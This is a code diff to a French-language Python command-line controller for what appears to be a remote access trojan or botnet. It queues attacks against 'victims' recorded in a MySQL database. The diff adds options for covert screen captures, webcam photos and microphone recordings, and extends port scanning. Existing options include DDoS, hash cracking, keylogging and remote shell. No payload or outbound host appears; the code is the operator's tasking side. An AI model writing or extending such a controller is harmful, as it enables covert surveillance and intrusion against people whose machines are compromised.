@@ -47,6 +47,15 @@ action_group.add_argument("--ddos", action="store_true", help="lance une attaque
 # Arguments spécifiques à l'attaque de crack
 action_group.add_argument("--crack", action="store_true", help="lance une attaque de crack sur un ordinateur")
 
+# Arguments spécifiques à l'attaque de screenshot
+action_group.add_argument("--screenshot", action="store_true", help="lance une capture d'écran sur un ordinateur")
+
+# Arguments spécifiques à l'attaque de picture
+action_group.add_argument("--picture", action="store_true", help="lance une capture de la webcam d'un ordinateur")
+
+# Arguments spécifiques à l'attaque de record voice
+action_group.add_argument("--record", action="store_true", help="lance un enregistrement audio sur un ordinateur")
+
 # Arguments spécifiques à l'attaque de keylogger
 action_group.add_argument("--keylogger", action="store_true", help="lance un keylogger sur un ordinateur")
 
@@ -69,6 +78,9 @@ action_group.add_argument("--no-multi-task", action="store_true",  help="Désact
 
 # Arguments pour les différentes attaques
 parser.add_argument("--port", type=int, help="démarre le serveur sur le port suivant")
+parser.add_argument("--port-scan", type=int, help="définit le port à scanner durant l'attaque scan")
+parser.add_argument("--port-start", type=int, help="définit le port de départ à scanner durant l'attaque scan")
+parser.add_argument("--port-end", type=int, help="définit le dernier port à scanner durant l'attaque scan")
 parser.add_argument("--address", type=str, help="adresse ip de l'ordinateur à attaquer")
 parser.add_argument("--time", type=int, help="temps de l'attaque (ddos/keylogger) en seconde")
 parser.add_argument("--hash", type=str, help="hash à cracker")
@@ -182,6 +194,72 @@ elif args.keylogger:
 
 ############################################################
 
+elif args.screenshot:
+    if not args.host : 
+        parser.error("--screenshot nécessite l'argument --host")
+
+    print("screenshot lancé sur " + args.host)
+
+    for victim in args.host.split(","):
+        query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+        values = (victim, victim, victim, )
+        mycursor.execute(query, values)
+
+        result = mycursor.fetchall()
+
+        for id in result:
+            query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+            values = (id[0], "screenshot", "pending", "{\"arg1\": \"\", \"arg2\": \"\", \"arg3\": \"\"}")
+
+            mycursor.execute(query, values)
+
+############################################################
+
+elif args.record:
+    if not args.host : 
+        parser.error("--record nécessite l'argument --host")
+    elif not args.time:
+        parser.error("--record nécessite l'argument --time")
+
+    print("record lancé pour une durée de " + str(args.time) + " secondes sur " + args.host)
+
+    for victim in args.host.split(","):
+        query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+        values = (victim, victim, victim, )
+        mycursor.execute(query, values)
+
+        result = mycursor.fetchall()
+
+        for id in result:
+            query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+            values = (id[0], "record", "pending", "{\"arg1\": \"--time " + str(args.time) + "\", \"arg2\": \"\", \"arg3\": \"\"}")
+
+            mycursor.execute(query, values)
+
+############################################################
+
+elif args.picture:
+    if not args.host : 
+        parser.error("--picture nécessite l'argument --host")
+
+    print("picture lancé sur " + args.host)
+
+    for victim in args.host.split(","):
+        query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+        values = (victim, victim, victim, )
+        mycursor.execute(query, values)
+
+        result = mycursor.fetchall()
+
+        for id in result:
+            query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+            values = (id[0], "picture", "pending", "{\"arg1\": \"\", \"arg2\": \"\", \"arg3\": \"\"}")
+
+            mycursor.execute(query, values)
+
+
+############################################################
+
 
 elif args.shell:
     if args.group:
@@ -225,26 +303,41 @@ elif args.scan:
             result = mycursor.fetchall()
 
             for id in result:
+
                 query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
-                values = (id[0], "scan", "pending", "test")
+
+                if args.address:
+                    if not args.port_scan and not args.port_start and not args.port_end:
+                        values = (id[0], "scan", "pending", "{\"arg1\": \"--ip " + str(args.address) + "\", \"arg2\": \"\", \"arg3\": \"\"}")
+                    
+                    elif args.port_scan:
+                        values = (id[0], "scan", "pending", "{\"arg1\": \"--ip " + str(args.address) + "\", \"arg2\": \"--port1 " + str(args.port_scan) + "\", \"arg3\": \"\"}")
+                    
+                    elif args.port_start and args.port_end :
+                        values = (id[0], "scan", "pending", "{\"arg1\": \"--ip " + str(args.address) + "\", \"arg2\": \"--port1 " + str(args.port_start) + "\", \"arg3\": \"--port2 " + str(args.port_end) + "\"}")
+
+                    else:
+                        parser.error("mauvaise utilisation de --scan. Veuillez n'utiliser que '--port_scan' ou '--port_start et --port_end'")
+                else:
+                    values = (id[0], "scan", "pending", "{\"arg1\": \"\", \"arg2\": \"\", \"arg3\": \"\"}")
 
                 mycursor.execute(query, values)
     
-    elif args.group:
-        print("lancement du scan sur " + args.group)
+    # elif args.group:
+    #     print("lancement du scan sur " + args.group)
     
-        for group in args.group.split(","):
-            query = "SELECT id FROM victims WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
-            values = (group, )
-            mycursor.execute(query, values)
+    #     for group in args.group.split(","):
+    #         query = "SELECT id FROM victims WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
+    #         values = (group, )
+    #         mycursor.execute(query, values)
 
-            result = mycursor.fetchall()
+    #         result = mycursor.fetchall()
 
-            for id in result:
-                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
-                values = (id[0], "scan", "pending", "test")
+    #         for id in result:
+    #             query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+    #             values = (id[0], "scan", "pending", "test")
 
-                mycursor.execute(query, values)
+    #             mycursor.execute(query, values)
 
     else:
         parser.error("mauvaise utilisation de --scan. Veuillez vous référer à l'aide")
